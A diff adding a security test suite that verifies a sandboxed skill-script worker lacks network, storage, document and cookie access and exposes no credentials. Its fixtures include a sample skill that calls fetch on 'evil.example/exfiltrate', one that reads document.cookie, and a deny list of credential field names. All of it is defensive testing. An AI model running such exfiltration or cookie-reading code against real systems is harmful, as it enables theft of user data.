@@ -111,6 +111,201 @@ describe('runSkillScript — ambient neutering', () => {
 });
 
 // ---------------------------------------------------------------------------
+// §10 SECURITY SUITE — sandbox isolation, no creds/PII, marketplace-only
+// Asserts the security matrix from docs/skill-script-runtime.md §10.
+// ---------------------------------------------------------------------------
+
+// ---------------------------------------------------------------------------
+// §10 Row: No network — full ambient-global set
+// §10 Row: No exfiltration — fetch call errors rather than sending
+// ---------------------------------------------------------------------------
+
+describe('security — no network globals in worker (§10)', () => {
+  /**
+   * Helper: run a tiny inline skill that returns typeof <global> for each name,
+   * then assert they're all 'undefined'.
+   */
+  async function assertGlobalsUndefined(names) {
+    const checks = names.map((n) => `${n}: typeof ${n}`).join(', ');
+    const scriptBody = `export async function run() { return { ${checks} }; }`;
+    const moduleUrl = makeSkillBlobUrl(scriptBody);
+    const manifest = makeFakeManifest();
+    try {
+      const result = await runSkillScript({ manifest, moduleUrl, input: {} });
+      expect(result.error).to.be.undefined;
+      for (const name of names) {
+        expect(result.json[name], `${name} should be undefined in worker`).to.equal('undefined');
+      }
+    } finally {
+      URL.revokeObjectURL(moduleUrl);
+    }
+  }
+
+  it('XMLHttpRequest is undefined inside the worker', async () => {
+    await assertGlobalsUndefined(['XMLHttpRequest']);
+  });
+
+  it('WebSocket is undefined inside the worker', async () => {
+    await assertGlobalsUndefined(['WebSocket']);
+  });
+
+  it('importScripts is undefined inside the worker', async () => {
+    await assertGlobalsUndefined(['importScripts']);
+  });
+
+  it('navigator.sendBeacon is undefined inside the worker', async () => {
+    const scriptBody = `export async function run() {
+      return { sendBeaconType: typeof (self.navigator && self.navigator.sendBeacon) };
+    }`;
+    const moduleUrl = makeSkillBlobUrl(scriptBody);
+    const manifest = makeFakeManifest();
+    try {
+      const result = await runSkillScript({ manifest, moduleUrl, input: {} });
+      expect(result.error).to.be.undefined;
+      expect(result.json.sendBeaconType).to.equal('undefined');
+    } finally {
+      URL.revokeObjectURL(moduleUrl);
+    }
+  });
+
+  it('a skill attempting fetch() errors rather than sending a request (exfiltration blocked)', async () => {
+    // fetch is undefined — calling it throws a TypeError; the worker catches it and
+    // posts { error } instead of completing normally.
+    const scriptBody = `export async function run() {
+      await fetch('https://evil.example/exfiltrate');
+      return { sent: true };
+    }`;
+    const moduleUrl = makeSkillBlobUrl(scriptBody);
+    const manifest = makeFakeManifest();
+    try {
+      const result = await runSkillScript({ manifest, moduleUrl, input: {} });
+      // Must not return { json: { sent: true } } — it must error
+      expect(result.json?.sent).to.be.undefined;
+      expect(result.error).to.be.a('string');
+    } finally {
+      URL.revokeObjectURL(moduleUrl);
+    }
+  });
+});
+
+// ---------------------------------------------------------------------------
+// §10 Row: No storage — indexedDB, caches, localStorage absent in worker
+// ---------------------------------------------------------------------------
+
+describe('security — no storage globals in worker (§10)', () => {
+  it('indexedDB is undefined inside the worker', async () => {
+    const scriptBody = 'export async function run() { return { t: typeof indexedDB }; }';
+    const moduleUrl = makeSkillBlobUrl(scriptBody);
+    const manifest = makeFakeManifest();
+    try {
+      const result = await runSkillScript({ manifest, moduleUrl, input: {} });
+      expect(result.error).to.be.undefined;
+      expect(result.json.t).to.equal('undefined');
+    } finally {
+      URL.revokeObjectURL(moduleUrl);
+    }
+  });
+
+  it('caches (CacheStorage) is undefined inside the worker', async () => {
+    const scriptBody = 'export async function run() { return { t: typeof caches }; }';
+    const moduleUrl = makeSkillBlobUrl(scriptBody);
+    const manifest = makeFakeManifest();
+    try {
+      const result = await runSkillScript({ manifest, moduleUrl, input: {} });
+      expect(result.error).to.be.undefined;
+      expect(result.json.t).to.equal('undefined');
+    } finally {
+      URL.revokeObjectURL(moduleUrl);
+    }
+  });
+
+  it('localStorage is unavailable inside the worker', async () => {
+    // localStorage is not part of the Worker spec — typeof returns 'undefined'.
+    const scriptBody = 'export async function run() { return { t: typeof localStorage }; }';
+    const moduleUrl = makeSkillBlobUrl(scriptBody);
+    const manifest = makeFakeManifest();
+    try {
+      const result = await runSkillScript({ manifest, moduleUrl, input: {} });
+      expect(result.error).to.be.undefined;
+      expect(result.json.t).to.equal('undefined');
+    } finally {
+      URL.revokeObjectURL(moduleUrl);
+    }
+  });
+});
+
+// ---------------------------------------------------------------------------
+// §10 Row: No document/cookies — document absent in worker
+// ---------------------------------------------------------------------------
+
+describe('security — no document or cookies in worker (§10)', () => {
+  it('document is undefined inside the worker', async () => {
+    const scriptBody = 'export async function run() { return { t: typeof document }; }';
+    const moduleUrl = makeSkillBlobUrl(scriptBody);
+    const manifest = makeFakeManifest();
+    try {
+      const result = await runSkillScript({ manifest, moduleUrl, input: {} });
+      expect(result.error).to.be.undefined;
+      expect(result.json.t).to.equal('undefined');
+    } finally {
+      URL.revokeObjectURL(moduleUrl);
+    }
+  });
+
+  it('document.cookie is inaccessible (document is undefined)', async () => {
+    // Since document is absent, attempting to access document.cookie throws.
+    // The worker catches it and returns { error }.
+    const scriptBody = `export async function run() {
+      const c = document.cookie;
+      return { cookie: c };
+    }`;
+    const moduleUrl = makeSkillBlobUrl(scriptBody);
+    const manifest = makeFakeManifest();
+    try {
+      const result = await runSkillScript({ manifest, moduleUrl, input: {} });
+      expect(result.json?.cookie).to.be.undefined;
+      expect(result.error).to.be.a('string');
+    } finally {
+      URL.revokeObjectURL(moduleUrl);
+    }
+  });
+});
+
+// ---------------------------------------------------------------------------
+// §10 Row: No credentials/PII — host exposes only log + deps
+// ---------------------------------------------------------------------------
+
+describe('security — host object exposes only log and deps (§10)', () => {
+  it('Object.keys(host) is exactly [\'log\', \'deps\'] — no token/credential/ims/cookie/session fields', async () => {
+    // The skill enumerates all own keys on host and returns them.
+    const scriptBody = `export async function run(input, host) {
+      return { keys: Object.keys(host).sort() };
+    }`;
+    const moduleUrl = makeSkillBlobUrl(scriptBody);
+    const manifest = makeFakeManifest();
+    try {
+      const result = await runSkillScript({ manifest, moduleUrl, input: {} });
+      expect(result.error).to.be.undefined;
+      const keys = result.json.keys;
+      // Must contain exactly log and deps — nothing else
+      expect(keys).to.deep.equal(['deps', 'log']);
+      // Explicit deny: no credential-adjacent fields
+      const forbidden = ['token', 'accessToken', 'ims', 'cookie', 'session', 'auth', 'credential', 'secret', 'apiKey'];
+      for (const f of forbidden) {
+        expect(keys, `host must not expose '${f}'`).to.not.include(f);
+      }
+    } finally {
+      URL.revokeObjectURL(moduleUrl);
+    }
+  });
+});
+
+// ---------------------------------------------------------------------------
+// §10 Row: Capability gating — already tested in section 2 above (covered)
+// §10 Row: Dependency allowlist — already tested in section 6 above (covered)
+// ---------------------------------------------------------------------------
+
+// ---------------------------------------------------------------------------
 // 5. Timeout
 // ---------------------------------------------------------------------------
 
